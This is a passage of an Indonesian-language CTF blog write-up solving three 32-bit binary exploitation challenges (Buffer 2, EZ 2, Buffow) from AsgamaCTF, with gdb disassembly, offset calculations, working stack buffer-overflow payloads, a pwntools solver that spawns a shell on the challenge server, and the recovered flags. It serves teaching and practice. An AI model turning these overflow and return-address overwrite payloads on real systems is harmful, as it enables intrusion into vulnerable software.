   <span class="mh">0x08048527</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
   <span class="mh">0x08048529</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ecx</span>
   <span class="mh">0x0804852a</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x94</span>
   <span class="mh">0x08048530</span> <span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">call</span>   <span class="mh">0x80484eb</span> <span class="o">&lt;</span><span class="n">init</span><span class="o">&gt;</span>
   <span class="mh">0x08048535</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x0</span>
   <span class="mh">0x0804853c</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x10</span><span class="p">],</span><span class="mh">0x64</span>
   <span class="mh">0x08048543</span> <span class="o">&lt;+</span><span class="mi">39</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="mh">0x08048546</span> <span class="o">&lt;+</span><span class="mi">42</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x90</span><span class="p">]</span>
   <span class="mh">0x0804854c</span> <span class="o">&lt;+</span><span class="mi">48</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="n">eax</span>
   <span class="mh">0x0804854d</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">call</span>   <span class="mh">0x8048390</span> <span class="o">&lt;</span><span class="n">gets</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x08048552</span> <span class="o">&lt;+</span><span class="mi">54</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="mh">0x08048555</span> <span class="o">&lt;+</span><span class="mi">57</span><span class="o">&gt;</span><span class="p">:</span> <span class="nb">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x13377331</span>
   <span class="mh">0x0804855c</span> <span class="o">&lt;+</span><span class="mi">64</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">jne</span>    <span class="mh">0x8048576</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">90</span><span class="o">&gt;</span>
   <span class="mh">0x0804855e</span> <span class="o">&lt;+</span><span class="mi">66</span><span class="o">&gt;</span><span class="p">:</span> <span class="nb">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x10</span><span class="p">],</span><span class="mh">0x0</span>
   <span class="mh">0x08048562</span> <span class="o">&lt;+</span><span class="mi">70</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">jne</span>    <span class="mh">0x8048576</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">90</span><span class="o">&gt;</span>
   <span class="mh">0x08048564</span> <span class="o">&lt;+</span><span class="mi">72</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="mh">0x08048567</span> <span class="o">&lt;+</span><span class="mi">75</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="mh">0x8048620</span>
   <span class="mh">0x0804856c</span> <span class="o">&lt;+</span><span class="mi">80</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">call</span>   <span class="mh">0x80483b0</span> <span class="o">&lt;</span><span class="n">system</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x08048571</span> <span class="o">&lt;+</span><span class="mi">85</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="mh">0x08048574</span> <span class="o">&lt;+</span><span class="mi">88</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">jmp</span>    <span class="mh">0x8048586</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">106</span><span class="o">&gt;</span>
   <span class="mh">0x08048576</span> <span class="o">&lt;+</span><span class="mi">90</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="mh">0x08048579</span> <span class="o">&lt;+</span><span class="mi">93</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="mh">0x804862b</span>
   <span class="mh">0x0804857e</span> <span class="o">&lt;+</span><span class="mi">98</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">call</span>   <span class="mh">0x80483a0</span> <span class="o">&lt;</span><span class="n">puts</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x08048583</span> <span class="o">&lt;+</span><span class="mi">103</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="mh">0x08048586</span> <span class="o">&lt;+</span><span class="mi">106</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="mh">0x0804858b</span> <span class="o">&lt;+</span><span class="mi">111</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
   <span class="mh">0x0804858e</span> <span class="o">&lt;+</span><span class="mi">114</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">leave</span>  
   <span class="mh">0x0804858f</span> <span class="o">&lt;+</span><span class="mi">115</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">lea</span>    <span class="n">esp</span><span class="p">,[</span><span class="n">ecx</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
   <span class="mh">0x08048592</span> <span class="o">&lt;+</span><span class="mi">118</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">ret</span>    
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
</code></pre></div></div>

<p>Sama dengan soal <code class="language-plaintext highlighter-rouge">buffer1</code>, binary ini menggunakan <code class="language-plaintext highlighter-rouge">gets</code> untuk mengambil inputan yang diberi ukuran sebesar <code class="language-plaintext highlighter-rouge">0x90</code>.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x08048555</span> <span class="o">&lt;+</span><span class="mi">57</span><span class="o">&gt;</span><span class="p">:</span> <span class="nb">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x13377331</span>
   <span class="mh">0x0804855c</span> <span class="o">&lt;+</span><span class="mi">64</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">jne</span>    <span class="mh">0x8048576</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">90</span><span class="o">&gt;</span>
   <span class="mh">0x0804855e</span> <span class="o">&lt;+</span><span class="mi">66</span><span class="o">&gt;</span><span class="p">:</span> <span class="nb">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x10</span><span class="p">],</span><span class="mh">0x0</span>
   <span class="mh">0x08048562</span> <span class="o">&lt;+</span><span class="mi">70</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">jne</span>    <span class="mh">0x8048576</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">90</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Tetapi, dalam binary ini, ada 2 validasi yang harus dilalui.</p>
<ol>
  <li><code class="language-plaintext highlighter-rouge">ebp-0xc</code> harus bernilai <code class="language-plaintext highlighter-rouge">0x13377331</code></li>
  <li><code class="language-plaintext highlighter-rouge">ebp-0x10</code> harus bernilai <code class="language-plaintext highlighter-rouge">0x0</code></li>
</ol>

<h3 id="exploit-2">Exploit</h3>

<p>Sama seperti soal <a href="http://127.0.0.1:4000/write-ups/asgama-ctf-pwn-writeup/#buffer1-50-pts">Buffer 1</a>, hanya ada beberapa yang perlu dikalkulasi ulang.</p>
<ul>
  <li>Padding disini diganti dengan <code class="language-plaintext highlighter-rouge">0x0</code>.</li>
  <li>Panjang padding <code class="language-plaintext highlighter-rouge">0x90 - 0xc = 0x84 (132 dalam desimal)</code></li>
</ul>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'print "\x00"*132 + "\x31\x73\x37\x13"'</span> | nc asgama.web.id 40210
GamaCTF<span class="o">{</span>0v3RWrite_vAriaBl3_D0eL0e_G4n<span class="o">}</span>
</code></pre></div></div>
<h3 id="flag-2">Flag</h3>
<p><code class="language-plaintext highlighter-rouge">GamaCTF{0v3RWrite_vAriaBl3_D0eL0e_G4n}</code></p>

<h2 id="ez-2-150-pts">EZ 2 [150 pts]</h2>

<p>Diberikan file ELF-32 bit <a href="https://github.com/abdullahnz/Writeup/blob/master/AsgamaCTF/hehe">hehe</a> not stripped dan service  <code class="language-plaintext highlighter-rouge">asgama.web.id:40209</code></p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file hehe
hehe: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for </span>GNU/Linux 2.6.32, BuildID[sha1]<span class="o">=</span>91febecb162e2e4c737a82cd97f7f38040c28e55, not stripped
</code></pre></div></div>

<p>Dalam fungsi <code class="language-plaintext highlighter-rouge">main</code> hanya memanggil fungsi <code class="language-plaintext highlighter-rouge">hah</code> dan berikut hasil disassemble fungsi <code class="language-plaintext highlighter-rouge">hah</code> pada binary.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">pdisas</span> <span class="n">hah</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">hah</span><span class="p">:</span>
   <span class="mh">0x0804854e</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">push</span>   <span class="n">ebp</span>
   <span class="mh">0x0804854f</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
   <span class="mh">0x08048551</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x48</span>
   <span class="mh">0x08048554</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="mh">0x08048557</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x48</span><span class="p">]</span>
   <span class="mh">0x0804855a</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="n">eax</span>
   <span class="mh">0x0804855b</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">call</span>   <span class="mh">0x8048390</span> <span class="o">&lt;</span><span class="n">gets</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x08048560</span> <span class="o">&lt;+</span><span class="mi">18</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="mh">0x08048563</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">nop</span>
   <span class="mh">0x08048564</span> <span class="o">&lt;+</span><span class="mi">22</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">leave</span>  
   <span class="mh">0x08048565</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">ret</span>    
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
</code></pre></div></div>

<p>Fungsi <code class="language-plaintext highlighter-rouge">hah</code> menggunakan fungsi <code class="language-plaintext highlighter-rouge">gets</code> yang mempunyai bug <code class="language-plaintext highlighter-rouge">buffer overflow</code> untuk mengambil inputan dan memiliki panjang <code class="language-plaintext highlighter-rouge">0x48</code>.</p>

<p>Dalam binary juga terdapat fungsi <code class="language-plaintext highlighter-rouge">debug</code> yang memanggil shell jika semua validasi terpenuhi.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">pdisas</span> <span class="n">debug</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">debug</span><span class="p">:</span>
   <span class="mh">0x0804851c</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">push</span>   <span class="n">ebp</span>
   <span class="mh">0x0804851d</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
   <span class="mh">0x0804851f</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x8</span>
   <span class="mh">0x08048522</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nb">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="mh">0xaabbccdd</span>
   <span class="mh">0x08048529</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">jne</span>    <span class="mh">0x804854b</span> <span class="o">&lt;</span><span class="n">debug</span><span class="o">+</span><span class="mi">47</span><span class="o">&gt;</span>
   <span class="mh">0x0804852b</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="mh">0x0804852e</span> <span class="o">&lt;+</span><span class="mi">18</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="mh">0x8048620</span>
   <span class="mh">0x08048533</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">call</span>   <span class="mh">0x80483a0</span> <span class="o">&lt;</span><span class="n">puts</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x08048538</span> <span class="o">&lt;+</span><span class="mi">28</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="mh">0x0804853b</span> <span class="o">&lt;+</span><span class="mi">31</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="mh">0x0804853e</span> <span class="o">&lt;+</span><span class="mi">34</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="mh">0x804862b</span>
   <span class="mh">0x08048543</span> <span class="o">&lt;+</span><span class="mi">39</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">call</span>   <span class="mh">0x80483b0</span> <span class="o">&lt;</span><span class="n">system</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x08048548</span> <span class="o">&lt;+</span><span class="mi">44</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="mh">0x0804854b</span> <span class="o">&lt;+</span><span class="mi">47</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">nop</span>
   <span class="mh">0x0804854c</span> <span class="o">&lt;+</span><span class="mi">48</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">leave</span>  
   <span class="mh">0x0804854d</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">ret</span>    
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
</code></pre></div></div>

<h3 id="exploit-3">Exploit</h3>

<ol>
  <li>Padding sebesar <code class="language-plaintext highlighter-rouge">0x48 + 4 byte</code> untuk meng-overwrite register <code class="language-plaintext highlighter-rouge">ebp</code> untuk sampai ke <em>return addess</em>.</li>
  <li>Alamat fungsi <code class="language-plaintext highlighter-rouge">debug</code>.</li>
  <li>Argument untuk fungsi <code class="language-plaintext highlighter-rouge">debug</code> yaitu <code class="language-plaintext highlighter-rouge">0xaabbccdd</code>.</li>
  <li>Junk 4 byte sebelum argument <code class="language-plaintext highlighter-rouge">debug</code>, berikut layout stack.</li>
</ol>

<table>
  <thead>
    <tr>
      <th style="text-align: center">Register</th>
      <th style="text-align: center">Value</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center"><code class="language-plaintext highlighter-rouge">ebp-0x48</code></td>
      <td style="text-align: center"><code class="language-plaintext highlighter-rouge">0x41414141</code></td>
    </tr>
    <tr>
      <td style="text-align: center"><code class="language-plaintext highlighter-rouge">. . .</code></td>
      <td style="text-align: center"><code class="language-plaintext highlighter-rouge">0x41414141</code></td>
    </tr>
    <tr>
      <td style="text-align: center"><code class="language-plaintext highlighter-rouge">ebp-0x4</code></td>
      <td style="text-align: center"><code class="language-plaintext highlighter-rouge">0x41414141</code></td>
    </tr>
    <tr>
      <td style="text-align: center"><code class="language-plaintext highlighter-rouge">ebp</code></td>
      <td style="text-align: center"><code class="language-plaintext highlighter-rouge">0x0804851c</code></td>
    </tr>
    <tr>
      <td style="text-align: center"><code class="language-plaintext highlighter-rouge">ebp+0x4</code></td>
      <td style="text-align: center"><code class="language-plaintext highlighter-rouge">????</code></td>
    </tr>
    <tr>
      <td style="text-align: center"><code class="language-plaintext highlighter-rouge">ebp+0x8</code></td>
      <td style="text-align: center"><code class="language-plaintext highlighter-rouge">0xaabbccdd</code></td>
    </tr>
  </tbody>
</table>

<p>Berikut solver yang dibuat.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"asgama.web.id"</span><span class="p">,</span> <span class="mi">40209</span><span class="p">)</span>

<span class="n">offset</span>    <span class="o">=</span> <span class="mi">72</span> <span class="o">+</span> <span class="mi">4</span> 
<span class="n">debug</span>     <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804851c</span><span class="p">)</span> 
<span class="n">debug_arg</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xaabbccdd</span><span class="p">)</span> 

<span class="n">payload</span>  <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="n">offset</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">debug</span>  
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"JUNK"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">debug_arg</span>

<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Jalankan dan didapatkan shell.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python solver.py 
<span class="o">[</span>+] Opening connection to asgama.web.id on port 40209: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
Debug Mode
<span class="nv">$ </span><span class="nb">ls
</span>flag
hehe
<span class="nv">$ </span><span class="nb">cat </span>flag
GamaCTF<span class="o">{</span>R0P_r0P_FTW<span class="o">}</span>
<span class="nv">$ </span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Interrupted
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closed connection to asgama.web.id port 40209
</code></pre></div></div>
<h3 id="flag-3">Flag</h3>
<p><code class="language-plaintext highlighter-rouge">GamaCTF{R0P_r0P_FTW}</code></p>

<h2 id="buffow-200-pts">Buffow [200 pts]</h2>

<p>Diberikan file ELF 32-bit <a href="https://github.com/abdullahnz/Writeup/blob/master/AsgamaCTF/buffow">buffow</a> not stripped yang hanya meminta inputan tapi tidak mencetak output; dan service <code class="language-plaintext highlighter-rouge">asgama.web.id:40211</code></p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file buffow
buffow: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>10ddb3cec335906e1fc641fce780bffc73fcb09a, not stripped
</code></pre></div></div>

<p>Dalam binary ini mempunyai banyak fungsi, tetapi yang paling penting adalah fungsi <code class="language-plaintext highlighter-rouge">main</code> dan <code class="language-plaintext highlighter-rouge">flag</code>.
Saya coba membuat inputan dengan <code class="language-plaintext highlighter-rouge">pattern</code> yang ada di gdb.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">pattern</span> <span class="n">create</span> <span class="mi">300</span> <span class="n">exp</span>
<span class="n">Writing</span> <span class="n">pattern</span> <span class="n">of</span> <span class="mi">300</span> <span class="n">chars</span> <span class="n">to</span> <span class="n">filename</span> <span class="s">"exp"</span>
<span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">b</span> <span class="o">*</span><span class="mh">0x08049290</span>
<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">at</span> <span class="mh">0x8049290</span>
<span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="n">exp</span> 
<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">abdullahnz</span><span class="o">/</span><span class="n">AsgamaCTF</span><span class="o">/</span><span class="n">WriteUp</span><span class="o">/</span><span class="n">buffow</span> <span class="o">&lt;</span> <span class="n">exp</span>
<span class="p">...</span>
<span class="n">Stopped</span> <span class="n">reason</span><span class="p">:</span> <span class="n">SIGSEGV</span>
<span class="mh">0x41474141</span> <span class="ow">in</span> <span class="err">??</span> <span class="p">()</span>
<span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">pattern</span> <span class="n">offset</span> <span class="mh">0x41474141</span>
<span class="mi">1095188801</span> <span class="n">found</span> <span class="n">at</span> <span class="n">offset</span><span class="p">:</span> <span class="mi">52</span>
</code></pre></div></div>

<p>Terlihat pada offset 52 <code class="language-plaintext highlighter-rouge">eip</code> ter-overwrite dan bisa merubah <em>return address</em> fungsi <code class="language-plaintext highlighter-rouge">flag</code> yang ada pada alamat <code class="language-plaintext highlighter-rouge">0x080491c2</code>.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>objdump <span class="nt">-D</span> ./buffow | <span class="nb">grep </span>flag
080491c2 &lt;flag&gt;:
</code></pre></div></div>

<h3 id="exploit-4">Exploit</h3>

<ol>
  <li>Panjang padding yaitu 52 untuk sampai ke <em>return address</em>.</li>
  <li>Tambah alamat fungsi <code class="language-plaintext highlighter-rouge">flag</code> yaitu <code class="language-plaintext highlighter-rouge">0x080491c2</code>.</li>
  <li>Susun payload.</li>
</ol>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'print "A"*52 + "\xc2\x91\x04\x08"'</span> | ./buffow

<span class="nv">$ </span>Hmm
</code></pre></div></div>

<p>Program tidak ada output. Debug menggunakan <code class="language-plaintext highlighter-rouge">gdb</code> lihat apa yang sebenarnya terjadi pada program.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'print "A"*52 + "\xc2\x91\x04\x08"'</span> <span class="o">&gt;</span> exp
<span class="nv">$ </span>gdb <span class="nt">-q</span> ./buffow
Reading symbols from ./buffow...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
gdb-peda<span class="nv">$ </span>r &lt; exp 
Starting program: /home/abdullahnz/CTF/AsgamaCTF/PWN/buffow &lt; exp
<span class="o">[</span>Inferior 1 <span class="o">(</span>process 19910<span class="o">)</span> exited normally]
Warning: not running or target is remote
</code></pre></div></div>

<p>Ternyata program tidak mengalami <em>crash</em>. Coba tambah padding lagi dengan 200 karakter. Dan <code class="language-plaintext highlighter-rouge">flag</code> didapat.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'print "A"*52 + "\xc2\x91\x04\x08" + "B"*200 '</span> | ./buffow 
GamaCTF<span class="o">{</span>th3_re4l_fl4g_0n_th3_s3rv3r:<span class="o">))}</span>

<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'print "A"*52 + "\xc2\x91\x04\x08" + "B"*200'</span> | nc asgama.web.id 40211
GamaCTF<span class="o">{</span>Ini_Bukan_Flagnya<span class="o">}</span>
</code></pre></div></div>

<h3 id="flag-4">Flag</h3>
<p><code class="language-plaintext highlighter-rouge">GamaCTF{Ini_Bukan_Flagnya}</code></p>

<h2 id="notes">Notes</h2>
<p>Sebagian solver diatas dibuat dengan bantuan dari pwntools yang bisa didownload <a href="https://github.com/Gallopsled/pwntools">disini</a>.</p>

<h2 id="referensi">Referensi</h2>
<ol>
  <li><em>https://www.tutorialspoint.com/assembly_programming/assembly_conditions.htm <a href="https://www.tutorialspoint.com/assembly_programming/assembly_conditions.htm">(klik)</a></em></li>
  <li><em>https://en.wikipedia.org/wiki/Endianness <a href="https://en.wikipedia.org/wiki/Endianness">(klik)</a></em></li>
</ol>

  </div><div id="disqus_thread" style="margin-top:25px"></div>
  <script>
    var disqus_config = function () {
      this.page.url = 'http://localhost:4000/write%20up/ctf/pwn/2020/07/15/write-up-binex-asgama-ctf.html';
      this.page.identifier = 'http://localhost:4000/write%20up/ctf/pwn/2020/07/15/write-up-binex-asgama-ctf.html';
    };
    (function () {
      var d = document, s = d.createElement('script');
      s.src = 'https://abdullahnz.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments
      powered by Disqus.</a></noscript></div>

    </section>
  </main>
  <script src="/assets/js/simple-jekyll-search.min.js"></script>
  <script src="/assets/js/search.js"></script>
  
</body>

</html>
